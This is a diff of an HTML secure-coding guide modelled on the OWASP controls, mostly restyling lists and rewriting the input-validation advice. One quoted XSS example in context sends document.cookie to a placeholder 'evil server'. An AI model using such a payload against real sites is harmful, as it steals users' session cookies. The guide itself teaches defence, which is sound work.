@@ -734,7 +734,7 @@
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Consider the OWASP Application Security Verification Standard as a guide to define security requirements and generate test cases</li>
                                                                 <li>Scrum with the security team to ensure testing methods fix any defects</li>
                                                                 <li>Add a security champion to each development team. A security champion is a developer with an interest in security who helps amplify
@@ -746,7 +746,7 @@
                                                             </ul>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project" target="_blank">OWASP Application Security Verification Standard Project</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank">OWASP Testing Guide</a></li>
                                                             </ul>
@@ -773,7 +773,7 @@
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Parameterize the queries by binding the variables.</li>
                                                                 <li>Be cautious about allowing user input into object queries (OQL/HQL) or other advanced queries supported by the framework.</li>
                                                                 <li>Defend against SQL injection using proper database management system configuration.</li>
@@ -795,7 +795,7 @@ pstmt.<span style="color: #658b00">setInt</span>(<span style="color: #B452CD">2<
 </pre></div>                                                                       
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank">OWASP Query Parameterization Cheat Sheet</a></li>
                                                                 <li><a href="https://www.veracode.com/blog/intro-appsec/sql-injection-attacks-and-how-prevent-them-infographic" target="_blank">SQL Injection Attacks and How to Prevent Them Infographic</a></li>
                                                             </ul>
@@ -821,7 +821,7 @@ pstmt.<span style="color: #658b00">setInt</span>(<span style="color: #B452CD">2<
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Treat all data as untrusted, including dynamic content consisting of a mix of static, developer-built HTML/JavaScript, and data that was originally
                                                                     populated with user input</li>
                                                                 <li>Develop relevant encoding to address the spectrum of attack methods, including injection attacks.</li>
@@ -850,13 +850,14 @@ pstmt.<span style="color: #658b00">setInt</span>(<span style="color: #B452CD">2<
 img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&quot;</span> + <span style="color: #658b00">document</span>.cookie;
 <span style="color: #8B008B; font-weight: bold">&lt;/script&gt;</span>
 </pre></div>
-                                                            <p>The good news is that despite how common these attacks are, they are relativly easy to defend against.</p>
-                                                            
+                                                            <p>The good news is that despite how common these attacks are, they are relativly easy to defend against.  Most languages provide a built-in mechansim to support html encoding for inputs - and they should <b>ALWAYS</b> be used.</p>
+
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">OWASP XSS Filter Evasion Cheat Sheet</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet" target="_blank">OWASP DOM based XSS Prevention Cheat Sheet</a></li>
+                                                                <li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpserverutility.htmlencode?view=netframework-4.7.2" target="_blank">HTMLEncode for.NET framework</a></li>
                                                             </ul>
                                                         </div>
                                                     </div>
@@ -881,28 +882,25 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
-                                                                <li>Consider the OWASP Application Security Verification Standard as a guide to define security requirements and generate test cases</li>
-                                                                <li>Scrum with the security team to ensure testing methods fix any defects</li>
-                                                                <li>Add a security champion to each development team. A security champion is a developer with an interest in security who helps amplify
-                                                                    the security message at the team level. Security champions don’t need to be security pros; they just need to act as the security conscience of the team,
-                                                                    keeping their eyes and ears open for potential issues. Once the team is aware of these issues, it can then either fix the issues in development or call in your
-                                                                    organization’s security experts to provide guidance.</li>
-                                                                <li>Consider data protections from the beginning. Include security up front when agreeing upon the definition of “done” for a project</li>
-                                                                <li>Integrate security testing in continuous integration to create fast, automated feedback loops</li>
+                                                            <ul class="checkItem">
+                                                                <li>Assume that all incoming data is untrusted. </li>
+                                                                <li>Develop whitelists for checking syntax. For example, regular expressions are a great way to implement whitelist validation, as they offer a way to
+                                                                    check whether data matches a specific pattern. </li>
+                                                                <li>Make sure input validation takes place exclusively on the server side. This extends across multiple components, including HTTP headers,
+                                                                    cookies, GET and POST parameters (including hidden fields), and file uploads. It also encompasses user devices and back-end web services.</li>
+                                                                <li>Use client-side controls only as a convenience or for notifying users. It should not be relied on as a hijacker could easily bypass browser or client based security 
+                                                                    and send their own input to the server.
+                                                                </li>
                                                             </ul>
                                                             <hr>
                                                             <h3>THOUGHTS</h3>
-                                                            <p>This category includes some of the most common attacks to befound in the wild - includingCrossSiteScripting (XSS).  Cross-site scripting is where things begin to get 
-                                                                really interesting, starting with the fact that it’s by far and away the most commonly exploited vulnerability out there today. Last year, WhiteHat Security delivered 
-                                                                their Website Security Statistics Report and found a staggering 65% of websites with XSS vulnerabilities, that’s four times as many as the SQL injection vulnerability 
-                                                                we just looked at.</p>
+                                                            <p></p>
                                                             <hr>
                                                             <h3>EXAMPLES - Validating Emails</h3>
                                                             <p></p>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project" target="_blank">OWASP Application Security Verification Standard Project</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank">OWASP Testing Guide</a></li>
                                                             </ul>
@@ -928,7 +926,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Use strong authentication methods, including multi-factor authentication,  such as FIDO or dedicated apps.</li>
                                                                 <li>Consider biometric authentication methods, such as fingerprint, facial recognition, and voice recognition, to verify the identity of users. </li>
                                                                 <li>Implement secure password storage. </li>
@@ -942,7 +940,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             <p></p>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet" target="_blank">OWASP Authentication Cheat Sheet</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet" target="_blank">OWASP Password Storage Cheat Sheet</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet" target="_blank">OWASP Session Management Cheat Sheet</a></li>
@@ -970,7 +968,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Use a security-centric design, where access is verified first. Consider using a filter or other automated mechanism to ensure that all requests go through
                                                                     an access control check.</li>
                                                                 <li>Consider denying all access for features that haven’t been configured for access control.</li>
@@ -984,7 +982,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             <h3>EXAMPLES - Coding to Activity</h3>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Access_Control_Cheat_Sheet" target="_blank">OWASP Access Control Cheat Sheet</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/Testing_for_Authorization" target="_blank">OWASP Testing Guide for Authorization</a></li>
                                                                 <li><a href="https://www.veracode.com/security/spoofing-attack" target="_blank">Veracode Guide to Spoofing Attacks</a></li>
@@ -1011,7 +1009,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Don’t be tempted to implement your own homegrown libraries. Use security-focused, peer-reviewed, and open source libraries, including
                                                                     the Google KeyCzar project, Bouncy Castle, and the functions included in SDKs. Most modern languages have implemented crypto-libraries and
                                                                     modules, so choose one based on your application’s language. </li>
@@ -1026,7 +1024,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             <p></p>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet" target="_blank">OWASP Password Storage Cheat Sheet</a></li>
                                                                 <li><a href="https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet" target="_blank">OWASP Cryptographic Storage Cheat Sheet</a></li>
                                                                 <li><a href="https://www.veracode.com/blog/research/cryptographically-secure-pseudo-random-number-generator-csprng" target="_blank">Cryptographically Secure Pseudo-Random Number Generators</a></li>
@@ -1056,7 +1054,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Use an extensible logging framework like Serilog, or Apache Log4j2 / Log4net, to ensure that all log entries are consistent.</li>
                                                                 <li>Keep various audit and transaction logs separate for both security and auditing purposes.</li>
                                                                 <li>Always log the timestamp and identifying information, like source IP and user ID.</li>
@@ -1069,7 +1067,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             <p></p>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Logging_Cheat_Sheet" target="_blank">OWASP Logging Cheat Sheet</a></li>
                                                             </ul>
                                                         </div>
@@ -1094,7 +1092,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Use existing secure framework features rather than using new tools, such as third-party libraries.</li>
                                                                 <li>Because some frameworks have security flaws, build in additional controls or security protections as needed.</li>
                                                                 <li>Use web application security frameworks, including Spring Security, Apache Shiro, Django Security, and Flask security.</li>
@@ -1104,7 +1102,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </ul>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://info.veracode.com/webinars-not-a-free-lunch-a-best-practice-guide-on-how-to-get-a-handle-on-your-open-source-risk.html" target="_blank">A Best Practice Guide to Managing Your Open Source Risk</a></li>
                                                             </ul>
                                                         </div>
@@ -1129,7 +1127,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             </p>
                                                             <hr>
                                                             <h3>GUIDANCE</h3>
-                                                            <ul>
+                                                            <ul class="checkItem">
                                                                 <li>Conduct careful code reviews and use negative testing, including exploratory testing and pen testing, fuzzing, and fault injection, to identify problems in
                                                                     error handling.</li>
                                                                 <li>Manage exceptions in a centralized manner to avoid duplicated try/catch blocks in the code. In addition, verify that all unexpected behaviors are
@@ -1142,7 +1140,7 @@ img.src=<span style="color: #CD5555">&quot;http://&lt;some evil server&gt;.com?&
                                                             <p></p>
                                                             <hr>
                                                             <h3>ADDITIONAL RESOURCES</h3>
-                                                            <ul class="checkItem">
+                                                            <ul>
                                                                 <li><a href="https://www.owasp.org/index.php/Error_Handling" target="_blank">OWASP Code Review Guide: Error Handling</a></li>
                                                             </ul>
                                                         </div>
